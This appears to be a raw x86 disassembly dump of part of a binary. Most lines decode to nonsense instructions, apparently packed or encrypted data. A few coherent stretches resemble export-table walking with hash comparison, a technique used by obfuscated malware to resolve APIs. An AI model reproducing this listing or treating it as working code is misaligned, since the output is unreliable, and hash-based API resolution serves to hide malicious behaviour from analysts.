  414922:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414923:	sub    BYTE PTR [ebx],dh
  414925:	sub    bh,dh
  414927:	push   eax
  414928:	jnp    0x41491c
  41492a:	stc    
  41492b:	mov    dh,0xb5
  41492d:	mov    edi,0xec46d99f
  414932:	sub    ebx,DWORD PTR [eax+0x15]
  414935:	push   ss
  414936:	inc    edx
  414937:	xchg   eax,ecx
  414939:	mov    ebp,DWORD PTR [ebx-0x22800818]
  41493f:	cmp    ecx,DWORD PTR [ebx-0x713a4d66]
  414945:	pop    esi
  414946:	test   al,0xb3
  414948:	les    ecx,FWORD PTR [eax+0x36]
  41494b:	pushf  
  41494c:	mov    edx,0xf3cd0c12
  414951:	(bad)  
  414952:	mov    dh,0xd
  414954:	cli    
  414955:	jg     0x414957
  414957:	push   ss
  414958:	leave  
  414959:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41495a:	pop    esi
  41495b:	lea    esp,[ecx+0x7c3f9de3]
  414961:	cmp    esi,DWORD PTR [esi]
  414963:	and    eax,eax
  414965:	out    0x44,al
  414967:	int3   
  414968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414969:	out    0xf7,eax
  41496b:	cld    
  41496c:	mov    ds:0xa5642042,eax
  414971:	or     bl,BYTE PTR [edx+0x26]
  414974:	pop    ebp
  414975:	push   0xffffff8f
  414977:	in     al,dx
  414978:	sti    
  414979:	pop    edx
  41497a:	ja     0x4149b6
  41497c:	jnp    0x4149bb
  41497e:	cs jg  0x414961
  414981:	ror    BYTE PTR [ecx],cl
  414983:	(bad)  
  414984:	popa   
  414985:	(bad)  
  414986:	adc    eax,0xbea6a7ed
  41498b:	fist   DWORD PTR [ecx-0x4d]
  41498e:	les    esi,FWORD PTR [eax+0x5a]
  414991:	test   DWORD PTR [ebx+ecx*8],0xcfbb43a0
  414998:	xor    eax,0xba680e3e
  41499d:	dec    esi
  41499e:	mov    BYTE PTR [edi],dh
  4149a0:	jmp    0x618d9a73
  4149a5:	adc    eax,0x21b648ab
  4149aa:	adc    eax,0x4ba1c942
  4149af:	fidivr WORD PTR [esi-0x5716969a]
  4149b5:	jl     0x41496b
  4149b7:	pxor   mm5,QWORD PTR [ebx-0x32ffe2ac]
  4149be:	in     eax,dx
  4149bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149c0:	mov    dh,0x65
  4149c2:	xchg   ecx,eax
  4149c3:	sbb    ecx,ecx
  4149c5:	sar    DWORD PTR [eax],1
  4149c7:	push   edx
  4149c8:	(bad)  
  4149c9:	shl    DWORD PTR [esi],cl
  4149cb:	mov    ch,0xa7
  4149cd:	dec    ebp
  4149ce:	sti    
  4149cf:	jmp    0x4149ae
  4149d1:	or     DWORD PTR [ebp-0x13],esi
  4149d4:	fstp   QWORD PTR [eax]
  4149d6:	jg     0x4149b6
  4149d8:	in     al,0xf0
  4149da:	mov    bl,0x4f
  4149dc:	push   ss
  4149dd:	jmp    0x97e6:0x374a19e
  4149e4:	jmp    0x414a32
  4149e6:	jmp    0x1e1a:0xc8a4a974
  4149ed:	sar    BYTE PTR [edx],1
  4149ef:	push   ebx
  4149f0:	jl     0x41499a
  4149f2:	imul   edi,DWORD PTR [ebx-0x4955b30a],0xffffffc6
  4149f9:	call   0x50685fbb
  4149fe:	fsubp  st(7),st
  414a00:	ret    
  414a01:	adc    esi,DWORD PTR [eax]
  414a03:	call   0x15b64cb
  414a08:	mov    edx,0xa3ad29f0
  414a0d:	out    0x2f,al
  414a0f:	stos   DWORD PTR es:[edi],eax
  414a10:	fsubr  QWORD PTR [edi-0x7f]
  414a13:	cmp    ebp,DWORD PTR [edi]
  414a15:	sub    al,0xa7
  414a17:	jne    0x4149dc
  414a19:	inc    edi
  414a1a:	fsub   DWORD PTR [ebp+0xe]
  414a1d:	xor    al,0x76
  414a1f:	pop    ds
  414a20:	leave  
  414a21:	sub    al,BYTE PTR [ebx]
  414a23:	adc    al,0xff
  414a25:	cwde   
  414a26:	popa   
  414a27:	add    al,BYTE PTR [edx+ecx*4-0x500a17b2]
  414a2e:	or     eax,0x986aa8fc
  414a33:	ins    BYTE PTR es:[edi],dx
  414a34:	clc    
  414a35:	jo     0x414a1f
  414a37:	lods   eax,DWORD PTR ds:[esi]
  414a38:	in     eax,dx
  414a39:	xchg   ebx,eax
  414a3a:	(bad)  
  414a3b:	fsubr  QWORD PTR [edi-0x6fb80494]
  414a41:	lock push edi
  414a43:	sub    al,0xe7
  414a45:	xor    al,0x2c
  414a47:	rol    BYTE PTR [edx*2-0x557e4e88],cl
  414a4e:	stc    
  414a4f:	pop    ss
  414a50:	retf   0x7949
  414a53:	push   ds
  414a54:	retf   0xdf68
  414a57:	test   al,0xcb
  414a59:	loope  0x414a05
  414a5b:	xor    eax,DWORD PTR [ebx-0x7a]
  414a5e:	(bad)  
  414a5f:	jmp    0x414abb
  414a61:	dec    ecx
  414a62:	push   ecx
  414a63:	xchg   edi,eax
  414a64:	mov    ds:0x48427453,eax
  414a69:	jae    0x414a76
  414a6b:	mov    ah,BYTE PTR [ebx-0x4e5e874a]
  414a71:	test   DWORD PTR [ebx-0x5a],0xc60b0591
  414a78:	les    edx,FWORD PTR [eax+0x71]
  414a7b:	jmp    0x414a98
  414a7d:	in     eax,dx
  414a7e:	lods   al,BYTE PTR ds:[esi]
  414a7f:	loopne 0x414a17
  414a81:	adc    ah,dl
  414a83:	or     eax,0xc0337b4b
  414a88:	mov    eax,ds:0x72dc8119
  414a8e:	aaa    
  414a8f:	xchg   BYTE PTR [eax+ebp*4-0x64190c2d],ch
  414a96:	fidivr WORD PTR [esi-0x64be8a01]
  414a9c:	outs   dx,DWORD PTR ds:[esi]
  414a9d:	add    DWORD PTR ss:[esp+edi*2+0x2d],0xfdb244d0
  414aa6:	div    BYTE PTR [edx-0x66]
  414aa9:	add    al,0x6f
  414aab:	pop    ds
  414aac:	sbb    dl,dh
  414aae:	jnp    0x414a7e
  414ab0:	push   cs
  414ab1:	dec    esi
  414ab2:	ins    DWORD PTR es:[edi],dx
  414ab3:	sbb    eax,0xaf2d4657
  414ab8:	icebp  
  414ab9:	sub    ch,BYTE PTR [edi-0x504d340c]
  414abf:	daa    
  414ac0:	add    dh,BYTE PTR [ecx]
  414ac2:	sahf   
  414ac3:	ja     0x414b00
  414ac5:	jmp    DWORD PTR [ebp+0x61b0de9f]
  414acb:	inc    edi
  414acc:	cdq    
  414acd:	test   BYTE PTR [edi],ah
  414acf:	retf   0x893b
  414ad2:	cs popf 
  414ad4:	adc    BYTE PTR [ecx-0x25953635],0x4b
  414adb:	fcomp  st(0)
  414add:	stc    
  414ade:	and    DWORD PTR [ecx+ecx*4],esp
  414ae1:	bndldx bnd0,[eax+edx*4+0x6d]
  414ae6:	dec    esp
  414ae7:	sub    ch,BYTE PTR [esi-0xc1950d9]
  414aed:	neg    BYTE PTR [ebx+edi*2-0x54]
  414af1:	add    eax,DWORD PTR [eax+0xbf35e38]
  414af7:	fistp  DWORD PTR [ebp*8+0x857bbc]
  414afe:	mov    ebp,0xcbad841
  414b03:	and    dh,BYTE PTR [ebp+0x5c63f5aa]
  414b09:	xchg   esi,eax
  414b0a:	sbb    DWORD PTR [eax],ecx
  414b0c:	not    BYTE PTR [esp+eax*8+0x38]
  414b10:	adc    al,0x18
  414b12:	stos   DWORD PTR es:[edi],eax
  414b13:	enter  0xffcd,0xa2
  414b17:	scas   eax,DWORD PTR es:[edi]
  414b18:	test   eax,0xd725ed43
  414b1d:	push   0xa9ce705f
  414b22:	sbb    eax,0x6bf3d17
  414b27:	push   ecx
  414b28:	push   eax
  414b29:	xor    edi,0xc175dc18
  414b2f:	sar    BYTE PTR [edi-0x26],0xc2
  414b33:	add    eax,ebx
  414b35:	cmp    ecx,eax
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	aad    0xe
  414bb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bb9:	retf   
  414bba:	pop    ebx
  414bbb:	jnp    0x414c3c
  414bbd:	jo     0x414b78
  414bbf:	jle    0x414c31
  414bc1:	jo     0x414b59
  414bc3:	adc    al,BYTE PTR [ebp-0x15]
  414bc6:	adc    ebx,DWORD PTR [ebx]
  414bc8:	cdq    
  414bc9:	mov    dh,0x19
  414bcb:	dec    ebp
  414bcc:	jo     0x414b80
  414bce:	jg     0x414be8
  414bd0:	gs mov ebp,eax
  414bd3:	leave  
  414bd4:	and    al,0xff
  414bd6:	leave  
  414bd7:	cli    
  414bd8:	aas    
  414bd9:	adc    eax,0x1e6ccbbf
  414bde:	call   0x1cae55fa
  414be3:	mov    WORD PTR [eax-0x1d],ss
  414be6:	push   ss
  414be7:	xchg   ecx,eax
  414be8:	cmp    eax,esi
  414bea:	shl    DWORD PTR [esi],1
  414bec:	enter  0xde51,0x1a
  414bf0:	stos   BYTE PTR es:[edi],al
  414bf1:	push   eax
  414bf2:	repz or BYTE PTR [edx+0x70],0xbd
  414bf7:	dec    esi
  414bf8:	inc    ebp
  414bf9:	repnz stc 
  414bfb:	inc    esi
  414bfc:	scas   al,BYTE PTR es:[edi]
  414bfd:	dec    ebx
  414bfe:	push   ebx
  414bff:	fild   QWORD PTR [eax-0x440a4411]
  414c05:	fnstsw WORD PTR [edi-0x7]
  414c08:	out    0x22,eax
  414c0a:	dec    ecx
  414c0b:	fwait
  414c0c:	mov    esi,0x2fcdc585
  414c11:	mov    dh,0x46
  414c13:	inc    ecx
  414c14:	push   ebx
  414c15:	jl     0x414c51
  414c17:	(bad)  
  414c18:	cwde   
  414c19:	(bad)  
  414c1a:	sub    DWORD PTR [edx+0x50],edx
  414c1d:	jecxz  0x414bfc
  414c1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c20:	outs   dx,BYTE PTR ds:[esi]
  414c21:	sahf   
  414c22:	and    BYTE PTR [ecx],0x11
  414c25:	adc    DWORD PTR [ecx+0x1abc266f],0x9d0018ab
  414c2f:	nop
  414c30:	adc    al,BYTE PTR [ebp-0x31]
  414c33:	ins    BYTE PTR es:[edi],dx
  414c34:	out    dx,eax
  414c35:	xchg   esi,eax
  414c36:	inc    ebp
  414c37:	mov    DWORD PTR [edx-0x4c2a3c46],0xcce34461
  414c41:	jmp    0xbd5b7a9d
  414c46:	mov    bh,0x4b
  414c48:	jmp    0xc7e35a68
  414c4d:	retf   
  414c4e:	gs xor eax,0xbb00c0bd
  414c54:	add    cl,ch
  414c56:	rcr    BYTE PTR [esi-0x68],0x13
  414c5a:	xchg   esp,eax
  414c5b:	add    eax,0x81acbd90
  414c60:	lods   eax,DWORD PTR ds:[esi]
  414c61:	push   0x0
  414c63:	out    dx,eax
  414c64:	mov    edx,0x25e4200b
  414c69:	xchg   edi,eax
  414c6a:	jno    0x414c33
  414c6c:	dec    esp
  414c6d:	mov    edx,0xf44e466e
  414c72:	add    ebx,ecx
  414c74:	imul   esp,ebp,0xe9175fcc
  414c7a:	sub    DWORD PTR [esi+ebx*4-0x605fb7cd],esi
  414c81:	xlat   BYTE PTR ds:[ebx]
  414c82:	push   0xffffffd1
  414c84:	xor    eax,ebp
  414c86:	push   ds
  414c87:	jle    0x414cc6
  414c89:	add    al,0x7e
  414c8b:	rcr    BYTE PTR [eax+0x6d38686b],1
  414c91:	ja     0x414c43
  414c93:	adc    eax,0x5d9193d9
  414c98:	dec    esp
  414c99:	jbe    0x414d07
  414c9b:	dec    ebp
  414c9c:	jo     0x414cdf
  414c9e:	(bad)  
  414ca0:	mov    ecx,0xe1e9d6e
  414ca5:	cmp    ecx,DWORD PTR [esi+0x76]
  414ca8:	jle    0x414cc1
  414caa:	jno    0x414c4e
  414cac:	xor    eax,0x26dc12de
  414cb1:	popa   
  414cb2:	mov    eax,0xc435f88a
  414cb7:	mov    dl,0x21
  414cb9:	call   0xc0c3:0xd0b5e69e
  414cc0:	jmp    0x13aa:0xa2f98869
  414cc7:	daa    
  414cc8:	sub    dl,cl
  414cca:	fild   WORD PTR [esi]
  414ccc:	out    dx,eax
  414ccd:	lds    ebx,FWORD PTR [edx-0x17d64341]
  414cd3:	in     eax,dx
  414cd4:	mov    ebp,0xcbe7072d
  414cd9:	xor    DWORD PTR ds:0x64cb6ae7,esp
  414cdf:	mov    edx,0x183fe96a
  414ce4:	push   ss
  414ce5:	fidivr WORD PTR [edx-0x6a80b1d1]
  414ceb:	out    0xae,eax
  414ced:	adc    eax,0xf8e36298
  414cf2:	addr16 jl 0x414d63
  414cf5:	inc    edi
  414cf6:	mov    al,ds:0xd2366c58
  414cfb:	call   0x51b98a3a
  414d00:	fisttp DWORD PTR [eax]
  414d02:	daa    
  414d03:	in     eax,0xdc
  414d05:	fild   QWORD PTR [edx-0x1caa40d4]
  414d0b:	iret   
  414d0c:	test   eax,0x2bd23fa2
  414d11:	xchg   esi,eax
  414d12:	xor    DWORD PTR [ebp+0x70749d71],ecx
  414d18:	outs   dx,DWORD PTR ds:[esi]
  414d19:	clc    
  414d1a:	add    al,0x24
  414d1c:	pop    es
  414d1d:	jmp    0x46699539
  414d22:	js     0x414d8d
  414d24:	(bad)  
  414d25:	fmul   DWORD PTR [edi]
  414d27:	sbb    esi,0x3aecedc3
  414d2d:	test   eax,0xc3c3097b
  414d32:	jb     0x414d85
  414d34:	clc    
  414d35:	push   ds
  414d36:	or     edi,DWORD PTR ds:0x23815363
  414d3c:	into   
  414d3d:	ins    DWORD PTR es:[edi],dx
  414d3e:	xchg   dh,bh
  414d40:	sub    eax,0xa4d4f3bb
  414d45:	dec    esi
  414d46:	aam    0x17
  414d48:	xor    eax,DWORD PTR [edi+0x66444c56]
  414d4e:	sti    
  414d4f:	les    ebx,FWORD PTR [ecx]
  414d51:	nop
  414d52:	aaa    
  414d53:	jns    0x414d10
  414d55:	jns    0x414dcd
  414d57:	push   ebp
  414d58:	mov    ecx,0x657e906d
  414d5d:	sub    BYTE PTR [edi+0x1e50903e],bh
  414d63:	stos   BYTE PTR es:[edi],al
  414d64:	das    
  414d65:	xor    esp,DWORD PTR [ebp-0x5c]
  414d68:	mov    eax,?
  414d6a:	div    bl
  414d6c:	add    DWORD PTR es:[eax],esp
  414d6f:	xor    eax,0x5b02c43b
  414d74:	pusha  
  414d75:	(bad)  
  414d78:	test   DWORD PTR [ecx+0x6db87852],ecx
  414d7e:	inc    DWORD PTR [esi-0x1a]
  414d81:	shr    DWORD PTR ds:0xf8a1d345,1
  414d87:	sub    eax,0xe88997a8
  414d8c:	lods   eax,DWORD PTR gs:[esi]
  414d8e:	cs ins DWORD PTR es:[edi],dx
  414d90:	jmp    0x5ec0b078
  414d95:	dec    esp
  414d96:	cmp    DWORD PTR [ebp-0x20],ebx
  414d99:	clc    
  414d9a:	adc    DWORD PTR [eax+0x76],esp
  414d9d:	bnd jg 0x414dfb
  414da0:	push   esp
  414da1:	test   DWORD PTR [ecx],ecx
  414da3:	xchg   cl,dl
  414da5:	in     al,dx
  414da6:	jb     0x414e24
  414da8:	sti    
  414da9:	cmp    eax,0x338705c9
  414dae:	dec    edx
  414daf:	add    dl,BYTE PTR gs:[eax+ebx*2-0x29249cc8]
  414db7:	mov    eax,0x3ec7e392
  414dbc:	aaa    
  414dbd:	fimul  DWORD PTR [ebx-0x75]
  414dc0:	imul   esi,eax,0x78dd3a5
  414dc6:	jne    0x414e36
  414dc8:	icebp  
  414dc9:	xchg   edi,eax
  414dca:	dec    edi
  414dcb:	add    BYTE PTR [edi-0x1c],dl
  414dce:	es jecxz 0x414d9a
  414dd1:	fwait
  414dd2:	xchg   cl,al
  414dd4:	arpl   WORD PTR [esi+0x587759d4],cx
  414dda:	mov    eax,ds:0xb46b83a0
  414ddf:	mov    eax,0x854e2c9
  414de4:	mov    dl,0xe5
  414de6:	scas   al,BYTE PTR es:[edi]
  414de7:	adc    BYTE PTR ds:0x536b51c7,bl
  414ded:	bound  ecx,QWORD PTR [ebp-0x1a836d49]
  414df3:	sbb    edx,DWORD PTR [esi]
  414df5:	ficomp WORD PTR [edi-0x39c4b79c]
  414dfb:	mov    ss,WORD PTR [edi]
  414dfd:	call   0x5d677f0d
  414e02:	rcr    DWORD PTR [ebx-0x15],0x1b
  414e06:	ins    BYTE PTR es:[edi],dx
  414e07:	in     al,dx
  414e08:	sub    BYTE PTR [edx],cl
  414e0a:	sub    ecx,esi
  414e0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e0d:	fstp   DWORD PTR [esi+0x2051ed32]
  414e13:	shl    DWORD PTR ds:0x6ac3a8e0,1
  414e19:	add    al,0x76
  414e1b:	inc    edx
  414e1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e1d:	cmp    ecx,DWORD PTR cs:[ecx-0x797177c5]
  414e24:	inc    esi
  414e25:	dec    esp
  414e26:	push   es
  414e27:	call   0xe93e81e7
  414e2c:	adc    BYTE PTR [ecx+0x62],ch
  414e2f:	stos   BYTE PTR es:[edi],al
  414e30:	sbb    BYTE PTR [eax+ebx*1],0x7
  414e34:	xor    esi,0xb8af2a7c
  414e3a:	ins    DWORD PTR es:[edi],dx
  414e3b:	in     al,dx
  414e3c:	scas   al,BYTE PTR es:[edi]
  414e3d:	mov    ds:0x74b00d11,al
  414e42:	xchg   edx,eax
  414e43:	iret   
  414e44:	sub    ecx,DWORD PTR [edx]
  414e46:	loopne 0x414dd1
  414e48:	shl    esp,cl
  414e4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e4b:	into   
  414e4c:	ret    0x3e1e
  414e4f:	jmp    0xa405:0xc1dd9132
  414e56:	push   0x2d71b34e
  414e5b:	mov    bh,0x23
  414e5d:	and    ebp,edi
  414e5f:	lods   al,BYTE PTR ds:[esi]
  414e60:	addr16 in al,0x9
  414e63:	out    dx,al
  414e64:	mov    al,ds:0x6d3a2fab
  414e69:	fsubr  QWORD PTR [eax]
  414e6b:	sbb    esp,DWORD PTR [esi+0x385502c6]
  414e71:	mov    dl,0xdd
  414e73:	int    0xa3
  414e75:	pop    esi
  414e76:	in     al,dx
  414e77:	pop    ebx
  414e78:	aaa    
  414e79:	xchg   esp,eax
  414e7a:	lods   al,BYTE PTR ds:[esi]
  414e7b:	ja     0x414e9f
  414e7d:	pop    ebx
  414e7e:	cmp    dl,BYTE PTR [esi-0x5d]
  414e81:	cvtps2pi mm0,QWORD PTR [ecx+0x1261e132]
  414e88:	fs pop ecx
  414e8a:	push   0x5
  414e8c:	dec    ecx
  414e8d:	pop    ebx
  414e8e:	xchg   ebx,ecx
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	xchg   ecx,eax
  414ead:	(bad)
  414eb1:	js     0x414f32
  414eb3:	jo     0x414e6e
  414eb5:	jle    0x414f27
  414eb7:	jo     0x414e62
  414eb9:	icebp  
  414eba:	jmp    0xf330e9a8
  414ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ec0:	jl     0x414f2c
  414ec2:	ret    0x7bee
  414ec5:	and    DWORD PTR [edi+0x13],ebx
  414ec8:	fcomp  QWORD PTR [eax+0x552ac87]
  414ece:	ret    0xbd9b
  414ed1:	add    DWORD PTR [eax-0x4f],eax
  414ed4:	cmp    DWORD PTR [eax-0x34651ad6],eax
  414eda:	mov    ebx,0x76373955
  414edf:	mov    ds:0xd4942f95,al
  414ee4:	bound  esi,QWORD PTR [edx+0x45077911]
  414eea:	retf   0x63ef
  414eed:	xchg   BYTE PTR [ebx],bl
  414eef:	scas   eax,DWORD PTR es:[edi]
  414ef0:	mov    ?,WORD PTR [ecx+0x290725d1]
  414ef6:	inc    ecx
  414ef7:	pop    ds
  414ef8:	and    BYTE PTR [esi],dh
  414efa:	push   ebx
  414efb:	sbb    al,0x96
  414efd:	lock add BYTE PTR [eax+0x43fd1260],bl
  414f04:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f07:	add    al,0xb1
  414f09:	or     eax,0x85d6daa8
  414f0e:	imul   eax,eax,0x17872c9
  414f14:	lods   al,BYTE PTR ds:[esi]
  414f15:	add    DWORD PTR [ecx],0x79da444b
  414f1b:	xchg   edi,eax
  414f1c:	xor    DWORD PTR [edi+0x7e],edi
  414f1f:	xchg   esp,eax
  414f20:	setl   dh
  414f23:	je     0x414f9d
  414f25:	jl     0x414f48
  414f27:	or     eax,0xc94ed7ae
  414f2c:	inc    eax
  414f2d:	sbb    eax,0xf4859889
  414f32:	addr16 int3 
  414f34:	xchg   ecx,eax
  414f35:	rcl    DWORD PTR [edx],cl
  414f37:	(bad)  
  414f38:	fstp   QWORD PTR [ecx+0x16]
  414f3b:	xor    dl,dl
  414f3d:	cmp    eax,0x77315664
  414f42:	(bad)  
  414f44:	xor    dl,BYTE PTR [ebx-0x22f0e56d]
  414f4a:	data16 repnz stos BYTE PTR es:[edi],al
  414f4d:	(bad)  
  414f4e:	jbe    0x414f28
  414f50:	popf   
  414f51:	adc    eax,0x700685a8
  414f56:	xrstors [edx]
  414f59:	hlt    
  414f5a:	adc    BYTE PTR [ebp+0x77],al
  414f5d:	scas   eax,DWORD PTR es:[edi]
  414f5e:	cdq    
  414f5f:	cmp    edi,DWORD PTR [edx+0x28012791]
  414f65:	popa   
  414f66:	cmp    al,0x0
  414f68:	jecxz  0x414f07
  414f6a:	leave  
  414f6b:	icebp  
  414f6c:	mov    ds:0x141436fb,eax
  414f71:	push   es
  414f72:	cmp    edi,eax
  414f74:	push   ebp
  414f75:	xor    ebx,DWORD PTR [edx+0xbaee8ba]
  414f7b:	jae    0x414f4e
  414f7d:	xor    BYTE PTR [edx-0x5502cff2],ah
  414f83:	jns    0x414f49
  414f85:	popf   
  414f86:	fisub  WORD PTR [ebp+0x73]
  414f89:	gs mov edi,0x56c376cd
  414f8f:	xor    BYTE PTR [esi],ch
  414f91:	and    eax,0x58561ed3
  414f96:	pop    es
  414f97:	popf   
  414f98:	cwde   
  414f99:	ja     0x414fa4
  414f9b:	in     al,dx
  414f9c:	sub    BYTE PTR [edx-0x6e],bh
  414f9f:	nop
  414fa0:	stc    
  414fa1:	pop    edx
  414fa2:	push   0x14
  414fa4:	(bad)  
  414fa5:	fidiv  WORD PTR [ecx+0x47]
  414fa8:	inc    ebx
  414fa9:	and    esi,DWORD PTR [edx+0x7d]
  414fac:	or     al,0xdd
  414fae:	sbb    bl,BYTE PTR [esi+0x3]
  414fb1:	mov    esp,0x19a783bc
  414fb6:	pop    esi
  414fb7:	and    ah,ch
  414fb9:	lock stos BYTE PTR es:[edi],al
  414fbb:	inc    eax
  414fbc:	loop   0x414fa6
  414fbe:	jno    0x414f57
  414fc0:	test   DWORD PTR [edx-0x7c],ebp
  414fc3:	outs   dx,DWORD PTR cs:[esi]
  414fc5:	push   edx
  414fc6:	aad    0x73
  414fc8:	adc    al,0xe5
  414fca:	adc    edx,DWORD PTR [edx+0x4d]
  414fcd:	or     al,0xad
  414fcf:	and    DWORD PTR [edi-0x3a9e9ade],0x822395a6
  414fd9:	(bad)  
  414fda:	push   ebp
  414fdb:	fild   WORD PTR [esi+edi*8]
  414fde:	jmp    0xb45:0x267bba62
  414fe5:	pushf  
  414fe6:	cmp    DWORD PTR [ebx-0x38],eax
  414fe9:	out    0x12,al
  414feb:	imul   esi,DWORD PTR [edx],0x70687a24
  414ff1:	shl    BYTE PTR [edx-0x20],cl
  414ff4:	mov    al,0x7e
  414ff6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ff7:	xchg   DWORD PTR [esi+edx*2+0x18],ebx
  414ffb:	inc    ecx
  414ffc:	rcr    ch,1
  414ffe:	sti    
  414fff:	mov    BYTE PTR [edi-0x3ff4bbb6],dh
  415005:	mov    edx,0xb86a0474
  41500a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41500b:	mov    eax,ds:0x16ae0981
  415010:	in     eax,dx
  415011:	cmc    
  415012:	sbb    al,0x32
  415014:	(bad)  
  415015:	adc    dh,BYTE PTR [ecx]
  415017:	adc    DWORD PTR [eax-0x4e9d7b0b],esi
  41501d:	xchg   ecx,eax
  41501e:	cli    
  41501f:	hlt    
  415020:	push   ds
  415021:	dec    ebx
  415022:	sbb    eax,0x82683b5e
  415027:	add    bh,ch
  415029:	mov    esi,0xa14abe08
  41502e:	mov    ah,0x8
  415030:	jle    0x415018
  415032:	repz fild DWORD PTR [bp+si+0x7649]
  415038:	and    DWORD PTR [bx+di+0x6e],ecx
  41503c:	(bad)  
  41503d:	dec    esp
  41503e:	in     eax,0x12
  415040:	add    BYTE PTR [ebx-0x5a],dl
  415043:	int3   
  415044:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415045:	mov    bl,0xa6
  415047:	add    DWORD PTR [esi],edx
  415049:	into   
  41504a:	push   ds
  41504b:	push   esi
  41504c:	nop
  41504d:	repz fs push ebp
  415050:	mov    cl,0x43
  415052:	pop    edx
  415053:	jmp    0x99f8ff3a
  415058:	mov    eax,0xa63aca53
  41505d:	mov    ch,0x8
  41505f:	jmp    0x415036
  415061:	jle    0x414feb
  415063:	loop   0x414ff3
  415065:	or     eax,0x2137627f
  41506a:	cmp    DWORD PTR [esi+0x7f44d069],ecx
  415070:	adc    dh,BYTE PTR [ebx+0x70318642]
  415076:	scas   al,BYTE PTR es:[edi]
  415077:	addr16 push esp
  415079:	push   es
  41507a:	jbe    0x41501e
  41507c:	xchg   ebx,eax
  41507d:	sbb    DWORD PTR [edi],0xfeda07fd
  415083:	mov    WORD PTR [esi+edx*1-0x56561461],gs
  41508a:	and    eax,0xb62dd11a
  41508f:	lods   eax,DWORD PTR ds:[esi]
  415090:	aam    0xb6
  415092:	scas   al,BYTE PTR es:[edi]
  415093:	dec    esi
  415094:	mov    ch,0x6a
  415096:	or     eax,0x14debe76
  41509b:	mov    bh,0x2c
  41509d:	and    edi,ebx
  41509f:	xor    dl,bh
  4150a1:	cmp    edx,ebp
  4150a3:	iret   
  4150a4:	les    eax,FWORD PTR [ebx+0x4e0cd4dc]
  4150aa:	pop    es
  4150ab:	fwait
  4150ac:	push   0x4e
  4150ae:	loope  0x4150e7
  4150b0:	jmp    0x41507f
  4150b2:	leave  
  4150b3:	push   es
  4150b4:	sub    cl,BYTE PTR ds:0x999ed66d
  4150ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150bb:	mov    al,gs:0xeb2dff14
  4150c1:	mov    ah,0x12
  4150c3:	sub    DWORD PTR es:[ebx+edx*1-0x44],edi
  4150c8:	ja     0x415097
  4150ca:	data16 mov ch,0xc9
  4150cd:	sbb    edx,ebp
  4150cf:	sbb    al,0xd5
  4150d1:	and    edx,DWORD PTR [ebp+0x10b0f63f]
  4150d7:	call   0x3981:0xbdadba2
  4150de:	scas   al,BYTE PTR es:[edi]
  4150df:	and    BYTE PTR [ebx],ah
  4150e1:	ja     0x415102
  4150e3:	shr    BYTE PTR ds:0xbfb6a5ac,cl
  4150e9:	mov    al,0x5e
  4150eb:	inc    edx
  4150ec:	mov    esi,ebp
  4150ee:	sbb    BYTE PTR [ebx-0x2f],dl
  4150f1:	adc    BYTE PTR [ebx+0x2f],0x2
  4150f5:	int    0x5d
  4150f7:	stos   DWORD PTR es:[edi],eax
  4150f8:	xchg   esp,eax
  4150f9:	out    0x8e,al
  4150fb:	daa    
  4150fc:	jecxz  0x415161
  4150fe:	xor    BYTE PTR ds:0x47b4f78a,bl
  415104:	in     eax,0x94
  415106:	sub    esp,ebp
  415108:	and    ebp,DWORD PTR [edi+0x3dccaedb]
  41510e:	jae    0x41514e
  415110:	fcmovnbe st,st(5)
  415112:	adc    ch,BYTE PTR [ecx-0x20]
  415115:	rol    BYTE PTR [edx+0x23c8d251],1
